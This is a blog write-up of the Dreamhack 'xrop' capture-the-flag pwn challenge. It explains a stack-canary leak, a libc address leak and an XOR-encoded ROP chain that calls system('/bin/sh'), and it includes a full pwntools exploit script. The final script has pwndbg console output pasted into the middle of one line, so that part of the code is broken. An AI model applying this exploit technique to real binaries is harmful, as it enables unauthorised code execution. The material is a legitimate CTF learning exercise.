+++
date = '2026-05-19'
draft = false
title = 'Dreamhack xrop Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
General ROP, but input is xored?

---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+8h] [rbp-28h]
  int v5; // [rsp+Ch] [rbp-24h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  do
  {
    printf("Input: ");
    v5 = read(0, buf, 0x100u);
    for ( i = 1; i < v5; ++i )
      buf[i - 1] ^= buf[i];
    printf("You entered: %s\n", buf);
  }
  while ( strtok(buf, "exit") );
  return 0;
}
```

## Identifying the vulnerabilities

To bypass the input getting xor-ed, I made this helper function:

```python
def prep_addr(byted):
    leng = len(byted)
    byted_array = bytearray(byted)
    for i in range(0, leng):
        for j in range(i+1, leng):
            byted_array[i] ^= byted_array[j]
    return bytes(byted_array)
```

We're working with a canary here, so we first need to leak that. We can just calculate the offset, overwrite the null byte and receive it.

```python
payload = b"ABCD"*6 + b"X"
p.send(payload)
p.recvuntil(b"X")

canary_leak = p.recv(7)
canary = u64(canary_leak.rjust(8, b"\x00"))
print(f"canary is {hex(canary)}")
```

Now, we need to leak a libc address from the stack area, since we can't leak it with puts. I looked through the gadgets from the binary, and they all seemed like crap. 

It took me a while to find a proper libc address. The problem is we weren't provided with a libc, or at least a libc version. I assumed it was something along the lines of 2.35, and I was right, kind of.

I patched my binary to use `2.35-0ubuntu3.13_amd64`, to have my stack leaks at least somewhat aligned with the remote binary. I managed to find `libc_start_main` and the offsets matched with my local version. Great!

```python
#same thing dar acum leak libc
payload = b"ABCD"*50 
p.send(payload)
#pe la <__libc_start_call_main+128>

p.recvuntil(b"D")
libc_leak = p.recv(6)
libc_misterios = u64(libc_leak.ljust(8, b"\x00"))
```

Now came the bigger problem. I made a ROP chain using some gadgets from my guessy libc, with libc's system and binsh. It was working fine locally, but not remotely. What the problem was, is that my version was slightly off, because the remote one was `libc6_2.35-0ubuntu3.1_amd64`. I modified my offsets accordingly and finally, we can pop a shell and move on!

```python
#we dont have libc so no one gadget so need pop rdi ret gadget

libc = libc_misterios - 0x29e40
system = libc + 0x050d60
binsh = libc + 0x1d8698
pop_rdi_ret = libc + 0x2a3e5
ret = libc + 0xf41c9

print(f"libc is {hex(libc)}")

#overwrite return
payload = ( b"ABCD"*6 +
            p64(canary) + 
            p64(0xdeadbeefdeadbeef) + 
            p64(pop_rdi_ret) +
            p64(binsh) +
            p64(ret) +
            p64(system)
          )
 
payload_xor = prep_addr(payload)
p.send(payload_xor)
```

To actually activate the overwrite, we need to trigger the loop exit, by sending something that after xorring will be "exit". Or something like that, that `strtok` was doing something weird.

```python
#leave loop.
exit_hex = b"exit\x00"
exit = prep_addr(exit_hex)
p.send(exit)
```

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/xrop/deploy/prob')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:17279'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
   

#fiecare byte din input e xored cu urmatorul
#avem o addr de 8 bytes
#b[0] ^= b[1]   (trimitem din timp b0^b1^b2^b3^b4
#b[1] ^= b[2]   (trimitem din timp b1^b2^b3^b4
#b[2] ^= b[3]   (trimitem din timp b2^b3^b4)
#b[3] ^= b[4]...(trimitem din timp b3^b4)
#b[4] send
#more bytes
def prep_addr(byted):
    leng = len(byted)
    byted_array = bytearray(byted)
    for i in range(0, leng):
        for j in range(i+1, leng):
            byted_array[i] ^= byted_array[j]
    return bytes(byted_array)
    
#first off incercam un leak canary, apoi leak libc.

payload = b"ABCD"*6 + b"X"
p.send(payload)
p.recvuntil(b"X")

canary_leak = p.recv(7)
canary = u64(canary_leak.rjust(8, b"\x00"))
print(f"canary is {hex(canary)}")

#same thing dar acum leak libc
payload = b"ABCD"*50 
p.send(payload)
#pe la <__libc_start_call_main+128>

p.recvuntil(b"D")
libc_leak = p.recv(6)
libc_misterios = u64(libc_leak.ljust(8, b"\x00"))

print(f"libc misterios is {hex(libc_misterios-128)}")

#we dont have libc so no one gadget so need pop rdi ret gadget

libc = libc_misterios - 0x29e40
system = libc + 0x050d60
binsh = libc + 0x1d8698
pop_rdi_ret = libc + 0x2a3e5pwndbg> search '0x80093583000'
Searching for byte: b'0x80093583000'
pwndbg> search 0x80093583000
Searching for byte: b'0x80093583000'

ret = libc + 0xf41c9

print(f"libc is {hex(libc)}")

#overwrite return
payload = ( b"ABCD"*6 +
            p64(canary) + # b"\x00" +
            p64(0xdeadbeefdeadbeef) + #rbp null
            p64(pop_rdi_ret) +
            p64(binsh) +
            p64(ret) +
            p64(system)
          )
 
payload_xor = prep_addr(payload)
p.send(payload_xor)

#leave loop.
exit_hex = b"exit\x00"
exit = prep_addr(exit_hex)
p.send(exit)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/xrop.py)**.
